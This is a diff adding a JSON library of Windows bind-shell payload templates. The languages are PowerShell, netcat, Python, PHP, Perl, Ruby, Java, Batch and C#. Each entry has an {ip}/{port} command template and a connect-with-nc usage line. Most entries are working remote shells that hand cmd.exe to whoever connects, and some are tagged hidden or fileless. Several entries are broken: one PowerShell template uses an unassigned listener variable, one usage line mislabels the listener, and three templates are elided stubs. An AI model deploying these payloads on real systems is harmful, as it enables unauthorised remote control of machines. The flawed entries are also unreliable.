@@ -1,0 +1,84 @@
+{
+  "payloads": [
+    {
+      "os": "Windows",
+      "language": "PowerShell",
+      "description": "PowerShell bind shell that listens on a given port and redirects input/output to a TCP stream.",
+      "template": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TcpListener('{ip}',{port});$listener.Start();$client=$listener.AcceptTcpClient();$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String );$sendback2=$sendback + 'PS ' + (pwd).Path + '> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}",
+      "usage": "Start listener on attacker's machine with: nc {ip} {port}",
+      "tags": ["bind_tcp", "powershell", "interactive", "fileless"]
+    },
+    {
+      "os": "Windows",
+      "language": "Netcat",
+      "description": "Bind shell using nc.exe on Windows to listen for incoming connection.",
+      "template": "nc -lvnp {port} -e cmd.exe",
+      "usage": "Attacker connects with: nc {ip} {port}",
+      "tags": ["bind_tcp", "cmd", "simple", "netcat", "interactive"]
+    },
+    {
+      "os": "Windows",
+      "language": "Python",
+      "description": "Python-based bind shell for Windows with socket and subprocess handling.",
+      "template": "python -c \"import socket,subprocess,os;s=socket.socket();s.bind(('{ip}',{port}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call(['cmd.exe'])\"",
+      "usage": "Connect using netcat: nc {ip} {port}",
+      "tags": ["bind_tcp", "interactive", "python", "one-liner"]
+    },
+    {
+      "os": "Windows",
+      "language": "PHP",
+      "description": "PHP bind shell script for Windows using socket programming.",
+      "template": "php -r '$sock=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($sock,\"{ip}\",{port});socket_listen($sock,1);$client=socket_accept($sock);while(1){$cmd=socket_read($client,2048);$output=shell_exec($cmd);socket_write($client,$output,strlen($output));}'",
+      "usage": "Run PHP on target. Connect via netcat: nc {ip} {port}",
+      "tags": ["bind_tcp", "php", "script", "interactive"]
+    },
+    {
+      "os": "Windows",
+      "language": "Perl",
+      "description": "Simple Perl bind shell that listens and executes commands via cmd.exe.",
+      "template": "perl -e 'use Socket;$proto=getprotobyname(\"tcp\");socket(S,PF_INET,SOCK_STREAM,$proto);bind(S,sockaddr_in({port},inet_aton(\"{ip}\")));listen(S,SOMAXCONN);for(;accept(C,S);close C){open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"cmd.exe\");}'",
+      "usage": "Attacker connects using: nc {ip} {port}",
+      "tags": ["bind_tcp", "perl", "interactive", "fileless"]
+    },
+    {
+      "os": "Windows",
+      "language": "Ruby",
+      "description": "Ruby bind shell that opens cmd.exe when connected.",
+      "template": "ruby -rsocket -e 's=TCPServer.new(\"{ip}\",{port});c=s.accept;while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'",
+      "usage": "Use: nc {ip} {port} to connect",
+      "tags": ["bind_tcp", "ruby", "interactive", "script"]
+    },
+    {
+      "os": "Windows",
+      "language": "Java",
+      "description": "Java-based TCP bind shell using ServerSocket and Runtime exec.",
+      "template": "public class BindShell {public static void main(String[] args) throws Exception {java.net.ServerSocket s=new java.net.ServerSocket({port});java.net.Socket c=s.accept();java.io.InputStream in=c.getInputStream();java.io.OutputStream out=c.getOutputStream();Process p=new ProcessBuilder(\"cmd.exe\").redirectErrorStream(true).start();new Thread(() -> {try {in.transferTo(p.getOutputStream());} catch(Exception e){}}).start();p.getInputStream().transferTo(out);}}",
+      "usage": "Compile and run, then connect with nc {ip} {port}",
+      "tags": ["bind_tcp", "java", "compiled", "interactive"]
+    },
+    {
+      "os": "Windows",
+      "language": "Batch",
+      "description": "Batch script using PowerShell to set up a bind listener.",
+      "template": "@echo off\npowershell -Command \"& {Start-Process powershell -ArgumentList '-NoP -NonI -W Hidden -Command New-Object System.Net.Sockets.TcpListener(\"{ip}\",{port}); ...'}\"",
+      "usage": "Execute script, connect with nc {ip} {port}",
+      "tags": ["bind_tcp", "batch", "powershell", "wrapper"]
+    },
+    {
+      "os": "Windows",
+      "language": "PowerShell",
+      "description": "Shorter encoded PowerShell bind shell.",
+      "template": "powershell -enc UwB... (base64-encoded bind shell with {ip} and {port})",
+      "usage": "Connect using nc {ip} {port}, decode for analysis",
+      "tags": ["bind_tcp", "powershell", "encoded", "fileless"]
+    },
+    {
+      "os": "Windows",
+      "language": "C#",
+      "description": "C# bind shell using TcpListener and Process execution.",
+      "template": "using System.Net.Sockets; ... (code uses {ip}, {port})",
+      "usage": "Compile and run exe, connect via nc {ip} {port}",
+      "tags": ["bind_tcp", "dotnet", "csharp", "compiled"]
+    }
+  ]
+}
